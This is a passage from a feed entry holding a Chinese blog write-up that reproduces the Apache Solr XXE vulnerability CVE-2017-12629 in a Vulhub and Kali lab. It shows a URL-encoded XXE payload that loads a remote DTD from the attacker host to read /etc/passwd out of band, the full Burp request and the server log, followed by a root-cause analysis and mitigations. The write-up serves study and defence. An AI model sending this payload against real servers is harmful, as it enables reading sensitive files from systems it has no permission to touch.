class=&#34;hljs-string&#34;&gt;&amp;lt;root&amp;gt;&amp;amp;errmsg;&amp;lt;/root&amp;gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;encoded_payload = urllib.parse.quote(payload)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(encoded_payload)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;示例输出&lt;/strong&gt;（部分）：&lt;/p&gt;
+&lt;figure class=&#34;highlight llvm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs llvm&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;C&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;Fxml&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;version&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;D&lt;span class=&#34;hljs-variable&#34;&gt;%221&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;encoding&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;D&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;UTF&lt;span class=&#34;hljs-number&#34;&gt;-8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;F&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;C&lt;span class=&#34;hljs-title&#34;&gt;!DOCTYPE&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;root&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;B&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;C&lt;span class=&#34;hljs-title&#34;&gt;!ENTITY&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%25&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;remote&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;SYSTEM&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;http&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%2&lt;/span&gt;F&lt;span class=&#34;hljs-variable&#34;&gt;%2&lt;/span&gt;F&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%2&lt;/span&gt;Ftest&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;.dtd&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%25&lt;/span&gt;remote&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;B&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%25&lt;/span&gt;err&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;B&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;D&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;Croot&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;span class=&#34;hljs-variable&#34;&gt;%26&lt;/span&gt;errmsg&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;B&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;C&lt;span class=&#34;hljs-variable&#34;&gt;%2&lt;/span&gt;Froot&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;5-构造最终攻击请求&#34;&gt;&lt;a href=&#34;#5-构造最终攻击请求&#34; class=&#34;headerlink&#34; title=&#34;5. 构造最终攻击请求&#34;&gt;&lt;/a&gt;5. 构造最终攻击请求&lt;/h3&gt;&lt;p&gt;使用 Burp Suite 的 Repeater 模块，构造以下 GET 请求：&lt;/p&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/solr/demo/select?q=&amp;lt;Encoded_Payload&amp;gt;&amp;amp;wt=xml&amp;amp;defType=xmlparser&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;192.168.56.102:8983&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;*/*&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;完整示例&lt;/strong&gt;（替换 &lt;code&gt;&amp;lt;Encoded_Payload&amp;gt;&lt;/code&gt; 为实际编码结果）：&lt;/p&gt;
+&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;GET&lt;/span&gt; /solr/demo/select?q=%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;C%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;Fxml%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;version%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;D%&lt;span class=&#34;hljs-number&#34;&gt;221&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;encoding%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;D%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;UTF-&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;F%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;C!DOCTYPE%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;root%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;B%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;C!ENTITY%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;remote%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;SYSTEM%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;http%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;F%&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;F&lt;span class=&#34;hljs-number&#34;&gt;192.168.56.1&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;Ftest1.dtd%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;remote%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;err%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;D%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;Croot%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E%&lt;span class=&#34;hljs-number&#34;&gt;26&lt;/span&gt;errmsg%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;C%&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;Froot%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E&amp;amp;wt=xml&amp;amp;defType=xmlparser HTTP/&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;192.168.56.102:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User&lt;/span&gt;-Agent: Mozilla/&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; (Windows NT &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; Win64; x64)&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;: */*&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;: close&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;6-验证攻击效果&#34;&gt;&lt;a href=&#34;#6-验证攻击效果&#34; class=&#34;headerlink&#34; title=&#34;6. 验证攻击效果&#34;&gt;&lt;/a&gt;6. 验证攻击效果&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;发送请求后，观察 Kali 的 HTTP 服务日志：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;192.168.56.102 - - [01/Aug/2025 17:52:25] &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;GET /test1.dtd HTTP/1.1&amp;quot;&lt;/span&gt; 200 -&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+如果看到 Solr（&lt;code&gt;192.168.56.102&lt;/code&gt;）访问了 &lt;code&gt;test1.dtd&lt;/code&gt;，说明 DTD 被成功加载。&lt;/li&gt;
+&lt;li&gt;由于 Solr 不回显 &lt;code&gt;/etc/passwd&lt;/code&gt; 内容，攻击成功仅表现为 DTD 请求到达攻击者服务器，间接证明 XXE 触发。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;六、原理深入分析&#34;&gt;&lt;a href=&#34;#六、原理深入分析&#34; class=&#34;headerlink&#34; title=&#34;六、原理深入分析&#34;&gt;&lt;/a&gt;六、原理深入分析&lt;/h2&gt;&lt;h3 id=&#34;1-利用链条&#34;&gt;&lt;a href=&#34;#1-利用链条&#34; class=&#34;headerlink&#34; title=&#34;1. 利用链条&#34;&gt;&lt;/a&gt;1. 利用链条&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用户输入&lt;/strong&gt;：提交包含外部实体的 XML Payload。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Solr 解析&lt;/strong&gt;：&lt;code&gt;defType=xmlparser&lt;/code&gt; 触发 XML 解析器处理 &lt;code&gt;q&lt;/code&gt; 参数。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;加载 DTD&lt;/strong&gt;：解析器访问远程 DTD（&lt;code&gt;http://192.168.56.1/test1.dtd&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;引用文件&lt;/strong&gt;：DTD 中的实体尝试加载本地文件（如 &lt;code&gt;/etc/passwd&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;外带请求&lt;/strong&gt;：通过嵌套实体，Solr 发起对攻击者服务器的请求，携带文件内容或触发日志。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-关键点&#34;&gt;&lt;a href=&#34;#2-关键点&#34; class=&#34;headerlink&#34; title=&#34;2. 关键点&#34;&gt;&lt;/a&gt;2. 关键点&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;defType=xmlparser&lt;/code&gt;&lt;/strong&gt;：启用 Solr 的 XML 解析器，是触发 XXE 的核心。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;远程 DTD&lt;/strong&gt;：绕过 Solr 无回显限制，通过外带技术验证文件读取。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;嵌套实体&lt;/strong&gt;：通过 &lt;code&gt;%err&lt;/code&gt; 和 &lt;code&gt;&amp;amp;errmsg;&lt;/code&gt; 构造复杂实体链，确保文件被引用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-限制与挑战&#34;&gt;&lt;a href=&#34;#3-限制与挑战&#34; class=&#34;headerlink&#34; title=&#34;3. 限制与挑战&#34;&gt;&lt;/a&gt;3. 限制与挑战&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;无回显&lt;/strong&gt;：需依赖外带技术，增加利用复杂度。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络限制&lt;/strong&gt;：目标服务器需允许出站 HTTP 请求，否则 DTD 无法加载。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DTD 构造&lt;/strong&gt;：需要精确定义实体，避免解析错误。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;七、防护建议&#34;&gt;&lt;a href=&#34;#七、防护建议&#34; class=&#34;headerlink&#34; title=&#34;七、防护建议&#34;&gt;&lt;/a&gt;七、防护建议&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;升级 Solr 版本&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;升级到 Apache Solr 7.1.0 或更高版本，官方已修复 XXE 漏洞。&lt;/li&gt;
+&lt;li&gt;定期检查 Solr 更新，应用最新补丁。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;禁用 XML 解析器&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;禁用 &lt;code&gt;defType=xmlparser&lt;/code&gt;，或限制对 &lt;code&gt;/solr/demo/select&lt;/code&gt; 接口的访问。&lt;/li&gt;
+&lt;li&gt;在 Solr 配置文件中关闭不必要的查询解析器。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;限制出站网络请求&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;配置防火墙，阻止 Solr 实例访问外部 HTTP 资源。&lt;/li&gt;
+&lt;li&gt;使用网络策略（如 iptables）限制出站流量。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;启用 WAF&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;部署 Web 应用防火墙，检测包含 &lt;code&gt;&amp;lt;!DOCTYPE&lt;/code&gt; 或 &lt;code&gt;&amp;lt;!ENTITY&lt;/code&gt; 的 XML 请求。&lt;/li&gt;
+&lt;li&gt;配置正则规则，拦截潜在 XXE Payload。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;安全编码&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在开发中禁用 XML 外部实体解析，例如：&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;DocumentBuilderFactory&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;dbf&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; DocumentBuilderFactory.newInstance();&lt;br&gt;dbf.setFeature(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://apache.org/xml/features/disallow-doctype-decl&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;使用安全的 XML 解析库（如 SAX 或 DOM4J）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;日志监控&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;定期检查 Solr 日志，关注异常的 XML 解析请求。&lt;/li&gt;
+&lt;li&gt;监控出站网络流量，及时发现外带攻击。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;八、总结&#34;&gt;&lt;a href=&#34;#八、总结&#34; class=&#34;headerlink&#34; title=&#34;八、总结&#34;&gt;&lt;/a&gt;八、总结&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;项目&lt;/th&gt;
+&lt;th&gt;信息&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;漏洞编号&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;CVE-2017-12629&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;XXE（XML 外部实体注入）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Apache Solr &amp;lt; 7.1.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;利用方式&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;远程 DTD + 外带攻击&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;关键点&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;defType=xmlparser&lt;/code&gt; 触发 XML 解析&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;测试平台&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Vulhub + Kali Linux&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;危害&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;敏感文件读取、内网探测&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;Apache Solr CVE-2017-12629 XXE 漏洞展示了 XML 解析器开放外部实体解析的严重安全隐患。虽然利用过程因无回显和网络限制较为复杂，但通过远程 DTD 和外带技术，攻击者可成功读取目标服务器的敏感文件（如 &lt;code&gt;/etc/passwd&lt;/code&gt;）。开发者应及时升级 Solr 版本、禁用不安全的解析器、限制出站请求，并配合 WAF 和日志监控，构建多层次防御体系。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;“渗透测试的艺术在于：构造、验证、提权、保持优雅”&lt;/p&gt;
+</content>
+        <category term="Web安全" />
+        <category term="Solr" />
+        <category term="XXE" />
+        <category term="漏洞复现" />
+        <category term="Vulhub" />
+        <category term="Kali" />
+        <updated>2025-08-01T09:54:17.000Z</updated>
+    </entry>
+</feed>
